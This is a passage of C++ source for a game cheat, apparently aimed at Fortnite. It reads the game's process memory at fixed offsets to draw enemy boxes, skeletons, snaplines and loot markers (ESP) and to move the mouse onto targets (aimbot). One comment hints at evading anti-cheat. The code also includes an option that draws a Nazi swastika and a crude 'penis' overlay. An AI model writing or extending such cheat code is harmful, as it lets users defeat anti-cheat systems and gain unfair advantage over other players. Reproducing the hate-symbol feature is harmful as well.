			if (TargetX + ScreenCenterX > ScreenCenterX * 2) TargetX = 0;
		}

		if (x < ScreenCenterX)
		{
			TargetX = x - ScreenCenterX;
			TargetX /= AimSpeed;
			if (TargetX + ScreenCenterX < 0) TargetX = 0;
		}
	}

	if (y != 0)
	{
		if (y > ScreenCenterY)
		{
			TargetY = -(ScreenCenterY - y);
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY > ScreenCenterY * 2) TargetY = 0;
		}

		if (y < ScreenCenterY)
		{
			TargetY = y - ScreenCenterY;
			TargetY /= AimSpeed;
			if (TargetY + ScreenCenterY < 0) TargetY = 0;
		}
	}

	SetMouseAbsPosition(TargetX, TargetY);

	return;
}

void ActorLoop()
{
	while (true)
	{
		read<uintptr_t>(baseaddy + 0x0060); // trigger veh set - add module to whitelist filter

		actors::Uworld = read<DWORD_PTR>(baseaddy + 0xe11fdc8);
		actors::Gameinstance = read<DWORD_PTR>(actors::Uworld + 0x1b8);
		actors::LocalPlayers = read<DWORD_PTR>(actors::Gameinstance + 0x38);
		actors::Localplayer = read<DWORD_PTR>(actors::LocalPlayers);
		actors::PlayerController = read<DWORD_PTR>(actors::Localplayer + 0x30);
		actors::PlayerCameraManager = read<uint64_t>(actors::PlayerController + 0x340);
		actors::LocalPawn = read<DWORD_PTR>(actors::PlayerController + 0x330);
		actors::PlayerState = read<DWORD_PTR>(actors::LocalPawn + 0x2a8);
		actors::Rootcomp = read<DWORD_PTR>(actors::LocalPawn + 0x190);
		actors::relativelocation = read<Vector3>(actors::Rootcomp + 0x128);
		actors::Persistentlevel = read<DWORD_PTR>(actors::Uworld + 0x30);
		actors::ActorCount = read<DWORD>(actors::Persistentlevel + 0xA0);
		actors::AActors = read<DWORD_PTR>(actors::Persistentlevel + 0x98);

		std::vector<FNlEntity> Players;
		for (int i = 0; i < actors::ActorCount; ++i) {
			DWORD64 CurrentActor = read<DWORD_PTR>(actors::AActors + i * 0x8);
			int CurrentActorId = read<int>(CurrentActor + 0x18);

			float player_check = read<float>(CurrentActor + 0x4250);
			if (player_check == 10) {

				uintptr_t CurrentActorMesh = read<uint64_t>(CurrentActor + 0x310);
				int curactorid = read<int>(CurrentActor + 0x18);

				FNlEntity fnlEntity{ };
				fnlEntity.Actor = CurrentActor;
				fnlEntity.mesh = CurrentActorMesh;
				fnlEntity.ID = curactorid;

				Players.push_back(fnlEntity);
			}
		}
		entityList.clear();
		entityList = Players;
		Sleep(1);
	}
}

void InitCheat()
{
	static const auto size = ImGui::GetIO().DisplaySize;
	static const auto center = ImVec2(size.x / 2, size.y / 2);
	float closestDistance = FLT_MAX;
	FNlEntity fnlEntity{ };

	if (hitboxpos == 0) { hitbox = BONE_HEAD_ID; }
	else if (hitboxpos == 1) { hitbox = BONE_NECK_ID; }
	else if (hitboxpos == 2) { hitbox = BONE_CHEST_ID; }
	else if (hitboxpos == 3) { hitbox = BONE_PELVIS_ID; }
	else if (hitboxpos == 4) { hitbox = BONE_FEET_ID; }

	if (DynamicFov)
	{
		ImGui::GetOverlayDrawList()->AddCircle(ImVec2(Width / 2, Height / 2), FovSize, ImColor(225, 225, 225, 225), 34, 0.7f);
	}

	if (square) {

		ImGui::GetOverlayDrawList()->AddRect(ImVec2(ScreenCenterX - FovSize, ScreenCenterY - FovSize), ImVec2(ScreenCenterX + FovSize, ScreenCenterY + FovSize), ImColor(128, 224, 0, 200), 0, 2, 1.f);
	}

	if (Filledfov)
	{
		ImGui::GetOverlayDrawList()->AddCircleFilled(ImVec2(Width / 2, Height / 2), FovSize, ImColor(0, 0, 0, 180), 300);
	}

	if (crosshair)
	{
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 - 7, Height / 2), ImVec2(Width / 2 + 1, Height / 2), ImColor(255, 0, 0, 255), 1.0);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 + 8, Height / 2), ImVec2(Width / 2 + 1, Height / 2), ImColor(255, 0, 0, 255), 1.0);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 - 7), ImVec2(Width / 2, Height / 2), ImColor(255, 0, 0, 255), 1.0);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 + 8), ImVec2(Width / 2, Height / 2), ImColor(255, 0, 0, 255), 1.0);
	}

	if (heilhitler) { DrawCrossNazi(10, ImColor(255, 0, 0, 255)); }

	for (LootEntity LEntityList : LootentityList) {

		if (actors::LocalPawn)
		{

			uintptr_t ItemRootComponent = read<uintptr_t>(LEntityList.ACurrentItem + 0x190);
			Vector3 ItemPosition = read<Vector3>(ItemRootComponent + 0x128);
			float ItemDist = localactorpos.Distance(ItemPosition) / 100.f;
			std::string null = ("");
			auto IsSearched = read<BYTE>((uintptr_t)LEntityList.ACurrentItem + 0xfb9);
			if (IsSearched >> 7 & 1) continue;
			Vector3 ChestPosition;
			ChestPosition = W2S(ItemPosition);
			Vector3 VehiclePosition = W2S(ItemPosition);

			if (worldesp::world_chests)
			{
				if (strstr(LEntityList.GNames.c_str(), ("Tiered_Chest")) && worldesp::world_chests)
				{
					if (ItemDist < worldesp::WorldEspDistance)
					{
						Vector3 ChestPosition;
						ChestPosition = W2S(ItemPosition);
						std::string Text = null + ("Chest [") + std::to_string((int)ItemDist) + ("m]");
						DrawString(14, ChestPosition.x, ChestPosition.y, &Col.orange_, true, true, Text.c_str());
					}
				}
			}
			else if (worldesp::world_supplydrop && strstr(LEntityList.GNames.c_str(), ("AthenaSupplyDrop_C")))
			{
				if (ItemDist < worldesp::WorldEspDistance) {
					Vector3 ChestPosition;
					ChestPosition = W2S(ItemPosition);

					std::string Text = null + ("Supply Drop [") + std::to_string((int)ItemDist) + ("m]");
					DrawString(14, ChestPosition.x, ChestPosition.y, &Col.blue, true, true, Text.c_str());

				}
			}
			else if (worldesp::world_ammo && strstr(LEntityList.GNames.c_str(), ("Tiered_Ammo")))
			{
				if (ItemDist < worldesp::WorldEspDistance) {
					Vector3 ChestPosition;
					ChestPosition = W2S(ItemPosition);
					std::string Text = null + ("Ammo Box [") + std::to_string((int)ItemDist) + ("m]");
					DrawString(14, ChestPosition.x, ChestPosition.y, &Col.white, true, true, Text.c_str());

				}
			}
			//NPC_Pawn_Irwin_Predator_Robert_C   NPC_Pawn_Irwin_Prey_Burt_C				NPC_Pawn_Irwin_Simple_Smackie_C			NPC_Pawn_Irwin_Predator_Grandma_C			NPC_Pawn_Irwin_Simple_Avian_Crow_C
			else if ((worldesp::world_animal && (strstr(LEntityList.GNames.c_str(), ("NPC_Pawn_Irwin_Predator_Robert_C"))) || (strstr(LEntityList.GNames.c_str(), ("NPC_Pawn_Irwin_Prey_Burt_C"))) || (strstr(LEntityList.GNames.c_str(), ("NPC_Pawn_Irwin_Simple_Smackie_C"))) || (strstr(LEntityList.GNames.c_str(), ("NPC_Pawn_Irwin_Prey_Nug_C"))) || (strstr(LEntityList.GNames.c_str(), ("NPC_Pawn_Irwin_Predator_Grandma_C"))))) {
				if (ItemDist < worldesp::WorldEspDistance) {
					std::string Text = null + ("Animal [") + std::to_string((int)ItemDist) + ("m]");
					DrawString(14, VehiclePosition.x, VehiclePosition.y, &Col.white, true, true, Text.c_str());
				}
			}
			else if ((worldesp::world_boat && (strstr(LEntityList.GNames.c_str(), ("MeatballVehicle_L_C")))))
			{
				if (ItemDist < worldesp::WorldEspDistance) {
					Vector3 VehiclePosition = W2S(ItemPosition);
					std::string Text = null + ("Boat [") + std::to_string((int)ItemDist) + ("m]");
					DrawString(14, VehiclePosition.x, VehiclePosition.y, &Col.white, true, true, Text.c_str());
				}
			}
			else if ((worldesp::world_car && (strstr(LEntityList.GNames.c_str(), ("Vehicl")) || strstr(LEntityList.GNames.c_str(), ("Valet_Taxi")) || strstr(LEntityList.GNames.c_str(), ("Valet_BigRig")) || strstr(LEntityList.GNames.c_str(), ("Valet_BasicTr")) || strstr(LEntityList.GNames.c_str(), ("Valet_SportsC")) || strstr(LEntityList.GNames.c_str(), ("Valet_BasicC")))))
			{
				if (ItemDist < worldesp::WorldEspDistance) {
					Vector3 VehiclePosition = W2S(ItemPosition);
					std::string Text = null + ("Vehicle [") + std::to_string((int)ItemDist) + ("m]");
					DrawString(14, VehiclePosition.x, VehiclePosition.y, &Col.red, true, true, Text.c_str());
				}
			}
			else if (worldesp::world_weapon && strstr(LEntityList.GNames.c_str(), ("FortPickupAthena")) || strstr(LEntityList.GNames.c_str(), ("Fort_Pickup_Creative_C")))
			{
				if (ItemDist < worldesp::WorldEspDistance) {

					auto definition = read<uint64_t>(LEntityList.ACurrentItem + 0x2f8 + 0x18);
					BYTE tier = read<BYTE>(definition + 0x70);

					RGBA Color, RGBAColor;
					Vector3 ChestPosition = W2S(ItemPosition);

					auto DisplayName = read<uint64_t>(definition + 0x90);
					auto WeaponLength = read<uint32_t>(DisplayName + 0x38);
					wchar_t* WeaponName = new wchar_t[uint64_t(WeaponLength) + 1];

					std::string Text = wchar_to_char(WeaponName);
					std::string wtf2 = Text + (" [ ") + std::to_string((int)ItemDist) + ("M ]");
					if (tier == 2 && (worldesp::uncommon))
					{
						Color = Col.darkgreen;
					}
					else if ((tier == 3) && (worldesp::rare))
					{
						Color = Col.blue;
					}
					else if ((tier == 4) && (worldesp::epic))
					{
						Color = Col.purple;
					}
					else if ((tier == 5) && (worldesp::legendary))
					{
						Color = Col.orange;
					}
					else if ((tier == 6) && (worldesp::mythic))
					{
						Color = Col.yellow;
					}
					else if ((tier == 0) || (tier == 1) && (worldesp::common))
					{
						Color = Col.gray;
					}

					DrawString(14, ChestPosition.x, ChestPosition.y, &Color, true, true, wtf2.c_str());

				}

			}
		}
	}

	for (FNlEntity entity : entityList) {

		uintptr_t mesh = read<uintptr_t>(entity.Actor + 0x310);
		Vector3 Headpose = GetBoneWithRotation(mesh, 68);
		Vector3 bone00 = GetBoneWithRotation(mesh, 0);
		Vector3 bottome = W2S(bone00);
		Vector3 Headbox = W2S(Vector3(Headpose.x, Headpose.y, Headpose.z + 15));
		Vector3 w2sheade = W2S(Headpose);
		Vector3 vHeadBone = GetBoneWithRotation(mesh, 68);
		Vector3 vRootBone = GetBoneWithRotation(mesh, 0);
		Vector3 Chest = GetBoneWithRotation(mesh, 2);
		Vector3 vHeadBoneOut = W2S(Vector3(vHeadBone.x, vHeadBone.y, vHeadBone.z + 15));
		Vector3 vRootBoneOut = W2S(vRootBone);
		Vector3 vChestOut = W2S(Vector3(Chest.x, Chest.y, Chest.z + 15));

		auto curWep = read<uint64_t>(entity.Actor + 0x868);
		auto itemDef = read<uint64_t>(curWep + 0x3F0);
		auto itemName = read<uintptr_t>(itemDef + 0x90);

		float distance = actors::relativelocation.Distance(Headpose) / 100.f;

		float BoxHeight = abs(Headbox.y - bottome.y);
		float BoxWidth = BoxHeight * 0.55;

		float LeftX = (float)Headbox.x - (BoxWidth / 1);
		float LeftY = (float)bottome.y;

		float Height1 = abs(Headbox.y - bottome.y);
		float Width1 = Height1 * 0.65;

		float CornerHeight = abs(Headbox.y - bottome.y);
		float CornerWidth = CornerHeight * 0.5f;

		uint64_t CurrentVehicle = read<uint64_t>(actors::LocalPawn + 0x2310); //FortPlayerPawn::CurrentVehicle
		uintptr_t CurrentWeapon = read<uintptr_t>(actors::LocalPawn + 0x868); //FortPawn::CurrentWeapon 0x868

		int MyTeamId = read<int>(actors::PlayerState + 0x10e8);
		DWORD64 otherPlayerState = read<uint64_t>(entity.Actor + actors::PlayerState);
		int ActorTeamId = read<int>(otherPlayerState + 0x10e8);

		if (teamcheck == true) { if (MyTeamId == ActorTeamId) continue; }
		if (entity.Actor == actors::LocalPawn) continue;

		if (Esp || distance < VisDist);
		{

			if (vischeck) {

				if (Esp_ThreeDBox) {
					Vector3 vHeadBone = GetBoneWithRotation(mesh, 68);
					Vector3 vRootBone = GetBoneWithRotation(mesh, 0);
					Vector3 vHeadBoneOut = W2S(Vector3(vHeadBone.x, vHeadBone.y, vHeadBone.z + 15));
					Vector3 vRootBoneOut = W2S(vRootBone);

					if (vHeadBoneOut.x != 0 || vHeadBoneOut.y != 0 || vHeadBoneOut.z != 0)
					{

						Vector3 bottom1 = W2S(Vector3(vRootBone.x + 40, vRootBone.y - 40, vRootBone.z));
						Vector3 bottom2 = W2S(Vector3(vRootBone.x - 40, vRootBone.y - 40, vRootBone.z));
						Vector3 bottom3 = W2S(Vector3(vRootBone.x - 40, vRootBone.y + 40, vRootBone.z));
						Vector3 bottom4 = W2S(Vector3(vRootBone.x + 40, vRootBone.y + 40, vRootBone.z));

						Vector3 top1 = W2S(Vector3(vHeadBone.x + 40, vHeadBone.y - 40, vHeadBone.z + 15));
						Vector3 top2 = W2S(Vector3(vHeadBone.x - 40, vHeadBone.y - 40, vHeadBone.z + 15));
						Vector3 top3 = W2S(Vector3(vHeadBone.x - 40, vHeadBone.y + 40, vHeadBone.z + 15));
						Vector3 top4 = W2S(Vector3(vHeadBone.x + 40, vHeadBone.y + 40, vHeadBone.z + 15));

						if (isVisible(mesh)) {
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(top1.x, top1.y), IM_COL32(0, 255, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(top2.x, top2.y), IM_COL32(0, 255, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(top3.x, top3.y), IM_COL32(0, 255, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(top4.x, top4.y), IM_COL32(0, 255, 0, 255), 0.1f);

							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(bottom2.x, bottom2.y), IM_COL32(0, 255, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(bottom3.x, bottom3.y), IM_COL32(0, 255, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(bottom4.x, bottom4.y), IM_COL32(0, 255, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(bottom1.x, bottom1.y), IM_COL32(0, 255, 0, 255), 0.1f);

							ImGui::GetOverlayDrawList()->AddLine(ImVec2(top1.x, top1.y), ImVec2(top2.x, top2.y), IM_COL32(0, 255, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(top2.x, top2.y), ImVec2(top3.x, top3.y), IM_COL32(0, 255, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(top3.x, top3.y), ImVec2(top4.x, top4.y), IM_COL32(0, 255, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(top4.x, top4.y), ImVec2(top1.x, top1.y), IM_COL32(0, 255, 0, 255), 0.1f);
						}
						else if (!isVisible(mesh)) {

							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(top1.x, top1.y), IM_COL32(255, 0, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(top2.x, top2.y), IM_COL32(255, 0, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(top3.x, top3.y), IM_COL32(255, 0, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(top4.x, top4.y), IM_COL32(255, 0, 0, 255), 0.1f);

							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(bottom2.x, bottom2.y), IM_COL32(255, 0, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(bottom3.x, bottom3.y), IM_COL32(255, 0, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(bottom4.x, bottom4.y), IM_COL32(255, 0, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(bottom1.x, bottom1.y), IM_COL32(255, 0, 0, 255), 0.1f);

							ImGui::GetOverlayDrawList()->AddLine(ImVec2(top1.x, top1.y), ImVec2(top2.x, top2.y), IM_COL32(255, 0, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(top2.x, top2.y), ImVec2(top3.x, top3.y), IM_COL32(255, 0, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(top3.x, top3.y), ImVec2(top4.x, top4.y), IM_COL32(255, 0, 0, 255), 0.1f);
							ImGui::GetOverlayDrawList()->AddLine(ImVec2(top4.x, top4.y), ImVec2(top1.x, top1.y), IM_COL32(255, 0, 0, 255), 0.1f);
						}
					}
				}

				if (reloadCheck)
				{
					auto bIsReloadingWeapon = read<bool>(curWep + 0x329);

					if (isVisible(mesh)) {
						if (bIsReloadingWeapon)
							ImGui::GetOverlayDrawList()->AddText(ImVec2(vChestOut.x, vChestOut.y + 20), IM_COL32(255, 255, 255, 255), "PLAYER RELOADING");
					}
				}

				if (espdistance)
				{
					char name[64];
					sprintf_s(name, "%2.fm", distance);
					DrawString(16, Headbox.x, Headbox.y - 15, &Col.white, true, true, name);
				}

				if (DrawEnemyFov)
				{
					ImU32 FovVisCheck;
					if (isVisible(mesh)) {
						FovVisCheck = ImGui::GetColorU32({ 255, 255, 255, 255 });
					}
					else if (!isVisible(mesh)) {
						FovVisCheck = ImGui::GetColorU32({ 255,0,0,255 });
					}

					VisualSize = !distance;

					Vector3 HitBox = GetBoneWithRotation(mesh, hitbox);
					Vector3 HitBoxPos = W2S(Vector3(HitBox.x, HitBox.y, HitBox.z));

					ImGui::GetOverlayDrawList()->AddCircle(ImVec2(HitBoxPos.x, HitBoxPos.y), VisualSize, FovVisCheck, 200, 1.0f);
				}

				if (esp_playerbot)
				{
					if (isVisible(mesh)) {
						auto fname = GetNameFromFName(fnlEntity.ID);
						if (strstr(fname.c_str(), ("PlayerPawn_Athena_C")) || strstr(fname.c_str(), ("PlayerPawn_Athena_Phoebe_C")) || strstr(fname.c_str(), ("BP_MangPlayerPawn")))
							DrawString(15, Headbox.x, Headbox.y, &Col.white, true, true, ("BOT"));
					}
					else if (!isVisible(mesh)) {
						auto fname = GetNameFromFName(fnlEntity.ID);
						if (strstr(fname.c_str(), ("PlayerPawn_Athena_C")) || strstr(fname.c_str(), ("PlayerPawn_Athena_Phoebe_C")) || strstr(fname.c_str(), ("BP_MangPlayerPawn")))
							DrawString(15, Headbox.x, Headbox.y, &Col.red, true, true, ("BOT"));
					}
				}

				if (esp_fillbox) { if (isVisible(mesh)) { DrawFilledRect(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, ImColor(0, 0, 0, 125)); } else if (!isVisible) { DrawFilledRect(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, ImColor(0.787f, 0.130f, 0.130f, 0.400f)); } }
				if (Esp_boxcorners) { if (isVisible(mesh)) { DrawCorneredBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(128, 224, 0, 255), 2.5f); } else if (!isVisible(mesh)) { DrawCorneredBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(255, 0, 0, 255), 2.5f); } }
				if (Esp_fbox) { if (isVisible(mesh)) { DrawBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(128, 224, 0, 255)); } else if (!isVisible(mesh)) { DrawBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(255, 0, 0, 255)); } }


				if (Esp_snapline)
				{
					Vector3 vHeadBone = GetBoneWithRotation(mesh, hitbox);
					if (isVisible(mesh)) { DrawLine(Width / 2 - 0, Height, vHeadBone.x, vHeadBone.y, &Col.green, 0.5f); }
					else if (!isVisible(mesh)) { DrawLine(Width / 2 - 0, Height, vHeadBone.x, vHeadBone.y, &Col.red, 0.5f); }
				}

				if (Esp_Skeleton)
				{
					Vector3 vHeadBone = GetBoneWithRotation(mesh, 68);
					Vector3 vHip = GetBoneWithRotation(mesh, 2);
					Vector3 vNeck = GetBoneWithRotation(mesh, 67);
					Vector3 vUpperArmLeft = GetBoneWithRotation(mesh, 9);
					Vector3 vUpperArmRight = GetBoneWithRotation(mesh, 38);
					Vector3 vLeftHand = GetBoneWithRotation(mesh, 10);
					Vector3 vRightHand = GetBoneWithRotation(mesh, 39);
					Vector3 vLeftHand1 = GetBoneWithRotation(mesh, 30);
					Vector3 vRightHand1 = GetBoneWithRotation(mesh, 59);
					Vector3 vRightThigh = GetBoneWithRotation(mesh, 78);
					Vector3 vLeftThigh = GetBoneWithRotation(mesh, 71);
					Vector3 vRightCalf = GetBoneWithRotation(mesh, 79);
					Vector3 vLeftCalf = GetBoneWithRotation(mesh, 72);
					Vector3 vLeftFoot = GetBoneWithRotation(mesh, 73);
					Vector3 vRightFoot = GetBoneWithRotation(mesh, 80);
					Vector3 vPelvisOut = GetBoneWithRotation(mesh, 8);
					Vector3 vHeadBoneOut = W2S(vHeadBone);
					Vector3 vPelvis = W2S(vPelvisOut);
					Vector3 vHipOut = W2S(vHip);
					Vector3 vNeckOut = W2S(vNeck);
					Vector3 vUpperArmLeftOut = W2S(vUpperArmLeft);
					Vector3 vUpperArmRightOut = W2S(vUpperArmRight);
					Vector3 vLeftHandOut = W2S(vLeftHand);
					Vector3 vRightHandOut = W2S(vRightHand);
					Vector3 vLeftHandOut1 = W2S(vLeftHand1);
					Vector3 vRightHandOut1 = W2S(vRightHand1);
					Vector3 vRightThighOut = W2S(vRightThigh);
					Vector3 vLeftThighOut = W2S(vLeftThigh);
					Vector3 vRightCalfOut = W2S(vRightCalf);
					Vector3 vLeftCalfOut = W2S(vLeftCalf);
					Vector3 vLeftFootOut = W2S(vLeftFoot);
					Vector3 vRightFootOut = W2S(vRightFoot);

					DrawLine(vHeadBoneOut.x, vHeadBoneOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
					DrawLine(vHipOut.x, vHipOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
					DrawLine(vUpperArmLeftOut.x, vUpperArmLeftOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
					DrawLine(vUpperArmRightOut.x, vUpperArmRightOut.y, vNeckOut.x, vNeckOut.y, &Col.white, 0.6f);
					DrawLine(vLeftHandOut.x, vLeftHandOut.y, vUpperArmLeftOut.x, vUpperArmLeftOut.y, &Col.white, 0.6f);
					DrawLine(vRightHandOut.x, vRightHandOut.y, vUpperArmRightOut.x, vUpperArmRightOut.y, &Col.white, 0.6f);
					DrawLine(vLeftHandOut.x, vLeftHandOut.y, vLeftHandOut1.x, vLeftHandOut1.y, &Col.white, 0.6f);
					DrawLine(vRightHandOut.x, vRightHandOut.y, vRightHandOut1.x, vRightHandOut1.y, &Col.white, 0.6f);
					DrawLine(vLeftThighOut.x, vLeftThighOut.y, vHipOut.x, vHipOut.y, &Col.white, 0.6f);
					DrawLine(vRightThighOut.x, vRightThighOut.y, vHipOut.x, vHipOut.y, &Col.white, 0.6f);
					DrawLine(vLeftCalfOut.x, vLeftCalfOut.y, vLeftThighOut.x, vLeftThighOut.y, &Col.white, 0.6f);
					DrawLine(vRightCalfOut.x, vRightCalfOut.y, vRightThighOut.x, vRightThighOut.y, &Col.white, 0.6f);
					DrawLine(vLeftFootOut.x, vLeftFootOut.y, vLeftCalfOut.x, vLeftCalfOut.y, &Col.white, 0.6f);
					DrawLine(vRightFootOut.x, vRightFootOut.y, vRightCalfOut.x, vRightCalfOut.y, &Col.white, 0.6f);

					if (espextentions::penis)
					{
						auto penis = W2S({ vPelvis.x, vPelvis.y, vPelvis.z + 3 });
						DrawLine(vPelvis.x, vPelvis.y, penis.x, penis.y, &Col.white, 1.f);
					}

					if (espextentions::unicorn)
					{
						auto head = W2S({ vHeadBone.x, vHeadBone.y, vHeadBone.z + 3 });
						DrawLine(vHeadBone.x, vHeadBone.y, head.x, head.y, &Col.Magenta, 1.f);
					}

				}
			}
			else if (!vischeck)
			{
				if (DrawEnemyFov)
				{
					ImU32 FovVisCheck;
					bool TooClose = false;
					float ranged = localactorpos.Distance(Headpose) / 10.f;
					if (isVisible(mesh)) { FovVisCheck = ImGui::GetColorU32({ 255, 255, 255, 255 }); }
					else if (!isVisible(mesh)) { FovVisCheck = ImGui::GetColorU32({ 255,0,0,255 }); }

					if (ranged) { VisualSize = distance; }
					else if (!ranged) { VisualSize = !distance; }

					Vector3 HitBox = GetBoneWithRotation(mesh, hitbox);
					Vector3 HitBoxPos = W2S(Vector3(HitBox.x, HitBox.y, HitBox.z));
					ImGui::GetOverlayDrawList()->AddCircle(ImVec2(HitBoxPos.x, HitBoxPos.y), VisualSize, FovVisCheck, 200, 1.0f);
				}

				if (Esp_ThreeDBox) {

					Vector3 vHeadBone = GetBoneWithRotation(mesh, 68);
					Vector3 vRootBone = GetBoneWithRotation(mesh, 0);
					Vector3 vHeadBoneOut = W2S(Vector3(vHeadBone.x, vHeadBone.y, vHeadBone.z + 15));
					Vector3 vRootBoneOut = W2S(vRootBone);

					if (vHeadBoneOut.x != 0 || vHeadBoneOut.y != 0 || vHeadBoneOut.z != 0)
					{

						Vector3 bottom1 = W2S(Vector3(vRootBone.x + 40, vRootBone.y - 40, vRootBone.z));
						Vector3 bottom2 = W2S(Vector3(vRootBone.x - 40, vRootBone.y - 40, vRootBone.z));
						Vector3 bottom3 = W2S(Vector3(vRootBone.x - 40, vRootBone.y + 40, vRootBone.z));
						Vector3 bottom4 = W2S(Vector3(vRootBone.x + 40, vRootBone.y + 40, vRootBone.z));

						Vector3 top1 = W2S(Vector3(vHeadBone.x + 40, vHeadBone.y - 40, vHeadBone.z + 15));
						Vector3 top2 = W2S(Vector3(vHeadBone.x - 40, vHeadBone.y - 40, vHeadBone.z + 15));
						Vector3 top3 = W2S(Vector3(vHeadBone.x - 40, vHeadBone.y + 40, vHeadBone.z + 15));
						Vector3 top4 = W2S(Vector3(vHeadBone.x + 40, vHeadBone.y + 40, vHeadBone.z + 15));

						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(top1.x, top1.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(top2.x, top2.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(top3.x, top3.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(top4.x, top4.y), IM_COL32(144, 0, 255, 255), 0.1f);

						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(bottom2.x, bottom2.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(bottom3.x, bottom3.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(bottom4.x, bottom4.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(bottom1.x, bottom1.y), IM_COL32(144, 0, 255, 255), 0.1f);

						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top1.x, top1.y), ImVec2(top2.x, top2.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top2.x, top2.y), ImVec2(top3.x, top3.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top3.x, top3.y), ImVec2(top4.x, top4.y), IM_COL32(144, 0, 255, 255), 0.1f);
						ImGui::GetOverlayDrawList()->AddLine(ImVec2(top4.x, top4.y), ImVec2(top1.x, top1.y), IM_COL32(144, 0, 255, 255), 0.1f);
					}
				}


				if (reloadCheck)
				{
					auto bIsReloadingWeapon = read<bool>(curWep + 0x329);

					if (bIsReloadingWeapon)
						ImGui::GetOverlayDrawList()->AddText(ImVec2(vChestOut.x, vChestOut.y + 20), IM_COL32(255, 255, 255, 255), "PLAYER RELOADING");
				}

				if (espdistance)
				{
					char name[64];
					sprintf_s(name, "%2.fm", distance);
					DrawString(16, Headbox.x, Headbox.y - 15, &Col.white, true, true, name);
				}

				if (esp_playerbot)
				{
					int dist;
					if (!espdistance) { dist = 15; } else if (espdistance) { dist = 19; }
					auto fname = GetNameFromFName(fnlEntity.ID);
					if (strstr(fname.c_str(), ("PlayerPawn_Athena_C")) || strstr(fname.c_str(), ("PlayerPawn_Athena_Phoebe_C")) || strstr(fname.c_str(), ("BP_MangPlayerPawn")))
						DrawString(dist, Headbox.x, Headbox.y, &Col.white, true, true, ("BOT"));
				}

				if (esp_fillbox) { DrawFilledRect(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, ImColor(0, 0, 0, 125)); }
				if (Esp_boxcorners) { DrawCorneredBox(Headbox.x - (CornerWidth / 2), Headbox.y, CornerWidth, CornerHeight, IM_COL32(144, 0, 255, 255), 2.5f); }
